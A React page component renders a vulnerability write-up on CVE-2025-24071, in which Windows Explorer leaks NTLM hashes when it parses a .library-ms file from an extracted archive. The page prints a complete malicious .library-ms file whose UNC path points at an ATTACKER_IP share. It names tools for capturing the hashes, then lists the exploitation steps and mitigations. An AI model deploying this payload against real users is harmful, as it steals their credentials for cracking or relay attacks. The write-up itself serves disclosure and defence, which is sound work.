'use client'

import { Share2 } from 'lucide-react'
import { useState } from 'react'
import { CodeBlock, InlineCode } from '@/components/code-block'
import { SplitViewWrapper } from '@/components/split-view-wrapper'
import { assetPath } from '@/lib/asset-path'

interface WriteupContentProps {
  writeup: any
}

export function CveContent({ writeup }: WriteupContentProps) {
  const [copied, setCopied] = useState(false)

  return (
    <SplitViewWrapper>
      <article className="w-full max-w-3xl mx-auto px-6 py-20">
      <div className="text-center mb-8">
        <p className="text-sm font-mono text-zinc-400">{writeup.date}</p>
      </div>

      <h1 className="text-4xl md:text-5xl font-light text-center mb-6 font-mono leading-tight">
        {writeup.title}
      </h1>

      <div className="text-center mb-8 space-y-4">
        <p className="text-sm text-zinc-400 font-mono">{writeup.subtitle}</p>
        
        <div className="flex items-center justify-center gap-2">
          <Share2 size={16} className={copied ? "text-green-500" : "text-red-500"} />
          <button 
            onClick={() => {
              navigator.clipboard.writeText(window.location.href)
              setCopied(true)
              setTimeout(() => setCopied(false), 2000)
            }}
            className="text-sm font-mono cursor-pointer hover:text-red-400 transition-colors"
          >
            {copied ? "Copied!" : "Share"}
          </button>
        </div>
      </div>

      <div className="text-center mb-16">
        <p className="text-3xl text-white-500 font-bold tracking-widest">
          بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
        </p>
      </div>

      <div className="mb-16">
        <div className="w-full border-2 border-red-500/30 rounded-lg overflow-hidden bg-zinc-900">
          <img
            src={writeup.coverImage}
            alt={writeup.title}
            className="w-full h-96 object-cover"
          />
        </div>
      </div>

    
    {/* Main Content */}
    <div className="space-y-8 text-lg leading-relaxed text-zinc-300">
        
        
        <p className="text-center italic text-white-600 border-l-4 border-red-500 pl-6 py-4">
          {"Overview"}
        </p>
        <p>
          CVE-2025–24071 is a vulnerability in Windows File Explorer that allows unauthorized disclosure of NTLM hashes. When a user extracts a specially crafted .zip archive containing a malicious .library-ms file, Windows Explorer automatically parses the file and initiates an SMB authentication request to an attacker-controlled server, leaking the victim's NTLM hash without any additional user interaction.
        </p>

        <p className="text-center italic text-white-600 border-l-4 border-red-500 pl-6 py-4">
          {"Technical Deep Dive"}
        </p>
        <p>
          The vulnerability exploits Windows Library files (.library-ms), which are XML-based configuration files that define virtual folders aggregating content from multiple locations. These files are automatically parsed by Windows Explorer without user interaction, making them an ideal vector for NTLM hash disclosure attacks.
        </p>
        
        <p className="font-semibold text-white mt-6 mb-3">How .library-ms Files Work:</p>
        <p>
          Library files in Windows use XML structure to define searchable locations. They support both local paths and UNC (Universal Naming Convention) paths. The vulnerability arises when Windows Explorer processes a library file containing a UNC path to a remote SMB share—it automatically attempts to authenticate to that share, sending the user's NTLM credentials in the process.
        </p>

        <p className="font-semibold text-white mt-6 mb-3">Malicious .library-ms File Structure:</p>
        <CodeBlock 
          code={`<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>\\\\ATTACKER_IP\\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>`}
          language="xml"
          fileName="malicious.library-ms"
          showLineNumbers={true}
        />

        <p className="mt-6">
          The critical element is the <InlineCode>&lt;url&gt;</InlineCode> tag pointing to a UNC path (<InlineCode>\\\\ATTACKER_IP\\share</InlineCode>). When Windows Explorer processes this file, it automatically initiates an SMB connection to resolve the path, triggering NTLM authentication.
        </p>

        <p className="font-semibold text-white mt-6 mb-3">Why No User Interaction is Required:</p>
        <p>
          Unlike traditional phishing attacks that require users to click links or open files, this vulnerability is triggered simply by extracting the archive and viewing the folder contents in Windows Explorer. The File Explorer's automatic parsing and preview functionality initiates the SMB request in the background, making it a zero-click vulnerability from the user's perspective after extraction.
        </p>

        <p className="font-semibold text-white mt-6 mb-3">NTLM Hash Capture Process:</p>
        <p>
          When the victim's machine attempts to authenticate to the attacker's SMB server, it sends an NTLM authentication challenge-response. The attacker can capture this using tools like:
        </p>
        <ul className="list-disc list-inside space-y-2 ml-4 my-4">
          <li><strong>Responder:</strong> A popular LLMNR, NBT-NS and MDNS poisoner with built-in SMB server</li>
          <li><strong>Impacket's smbserver.py:</strong> Lightweight SMB server for hash capture</li>
          <li><strong>Metasploit's auxiliary/server/capture/smb:</strong> SMB authentication capture module</li>
        </ul>

        <p className="font-semibold text-white mt-6 mb-3">References & Source Code:</p>
        <ul className="list-disc list-inside space-y-2 ml-4">
          <li>
            <strong>Microsoft Security Advisory:</strong>{' '}
            <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24071" target="_blank" rel="noopener noreferrer" className="text-red-500 hover:text-red-400">
              CVE-2025-24071 Official Advisory
            </a>
          </li>
          <li>
            <strong>PoC Repository:</strong> Proof-of-concept exploits available on GitHub demonstrating .library-ms file creation and hash capture setup
          </li>
          <li>
            <strong>Responder Tool:</strong>{' '}
            <a href="https://github.com/lgandx/Responder" target="_blank" rel="noopener noreferrer" className="text-red-500 hover:text-red-400">
              github.com/lgandx/Responder
            </a>
          </li>
          <li>
            <strong>Impacket SMB Server:</strong>{' '}
            <a href="https://github.com/fortra/impacket" target="_blank" rel="noopener noreferrer" className="text-red-500 hover:text-red-400">
              github.com/fortra/impacket
            </a>
          </li>
        </ul>

        <p className="mt-6 p-4 bg-red-950/30 border border-red-500/30 rounded-lg">
          <strong className="text-red-400">⚠️ Security Note:</strong> This vulnerability has been patched by Microsoft. Always ensure your Windows systems are up-to-date with the latest security patches. The information provided here is for educational purposes only.
        </p>



        <p className="text-center italic text-white-600 border-l-4 border-red-500 pl-6 py-4">
          {"Affected Versions"}
        </p>
        <ul className="list-disc list-inside space-y-2 ml-4">
          <li>Windows 10 Version 1809 for x64-based Systems</li>
          <li>Windows 10 Version 1809 for 32-bit Systems</li>
          <li>Windows Server 2025 (Server Core installation)</li>
          <li>Windows Server 2025</li>
          <li>Windows Server 2012 R2 (Server Core installation)</li>
          <li>Windows Server 2012 R2</li>
          <li>Windows Server 2016 (Server Core installation)</li>
          <li>Windows Server 2016</li>
          <li>Windows 10 Version 1607 for x64-based Systems</li>
          <li>Windows 10 Version 1607 for 32-bit Systems</li>
          <li>Windows 10 for x64-based Systems</li>
          <li>Windows 10 for 32-bit Systems</li>
          <li>Windows 11 Version 24H2 for x64-based Systems</li>
          <li>Windows 11 Version 24H2 for ARM64-based Systems</li>
          <li>Windows Server 2022, 23H2 Edition (Server Core installation)</li>
          <li>Windows 11 Version 23H2 for x64-based Systems</li>
          <li>Windows 11 Version 23H2 for ARM64-based Systems</li>
          <li>Windows 10 Version 22H2 for 32-bit Systems</li>
          <li>Windows 10 Version 22H2 for ARM64-based Systems</li>
          <li>Windows 10 Version 22H2 for x64-based Systems</li>
          <li>Windows 11 Version 22H2 for x64-based Systems</li>
          <li>Windows 11 Version 22H2 for ARM64-based Systems</li>
          <li>Windows 10 Version 21H2 for x64-based Systems</li>
          <li>Windows 10 Version 21H2 for ARM64-based Systems</li>
          <li>Windows 10 Version 21H2 for 32-bit Systems</li>
          <li>Windows Server 2022 (Server Core installation)</li>
          <li>Windows Server 2022</li>
          <li>Windows Server 2019 (Server Core installation)</li>
          <li>Windows Server 2019</li>
        </ul>

        <p className="text-center italic text-white-600 border-l-4 border-red-500 pl-6 py-4">
          {"Exploitation Flow"}
        </p>
        <ol className="list-decimal list-inside space-y-2 ml-4">
          <li>The attacker creates a malicious .library-ms file pointing to their SMB server</li>
          <li>Attacker packages the file into a .zip archive</li>
          <li>The victim extracts the archive on a Windows machine</li>
          <li>Windows Explorer automatically parses the .library-ms file</li>
          <li>SMB request is sent to the attacker's server with the victim's NTLM hash</li>
          <li>The attacker captures the hash using responder or impacket-smbserver for offline cracking or relay attacks</li>
        </ol>


        <p className="text-center italic text-white-600 border-l-4 border-red-500 pl-6 py-4">
          {"PoC"}
        </p>
        <div className="my-8">
          <p className="text-sm text-zinc-400 font-mono mb-2">Exploitation Demo:</p>
          <div className="w-full border-2 border-red-500/30 rounded-lg overflow-hidden bg-zinc-900">
            <video 
              className="w-full"
              style={{ maxHeight: '600px' }}
              controls
              preload="auto"
              playsInline
            >
              <source src={assetPath('/writeup-images/CVE-2025-24071/PoC.mp4')} type="video/mp4" />
              Your browser does not support the video tag.
            </video>
          </div>
          <p className="text-xs text-zinc-500 font-mono mt-2 text-center">NTLM Hash Capture Demonstration</p>
        </div>
                
        <p className="text-center italic text-white-600 border-l-4 border-red-500 pl-6 py-4">
          {"Mitigation"}
        </p>

        <ul className="list-disc list-inside space-y-2 ml-4">
          <li>Apply Microsoft security patches for CVE-2025–24071</li>
          <li>Block outbound SMB traffic (ports 445, 139) at the firewall</li>
          <li>Disable NTLM authentication where possible</li>
          <li>Use SMB signing to prevent relay attacks</li>
          <li>Educate users about the risks of extracting untrusted archives</li>
        </ul>

      
        <p>That's it for this writeup, hope you enjoyed it and learned something new. See you in the next one!</p>
    </div>
    
    </article>
    </SplitViewWrapper>
  )
}
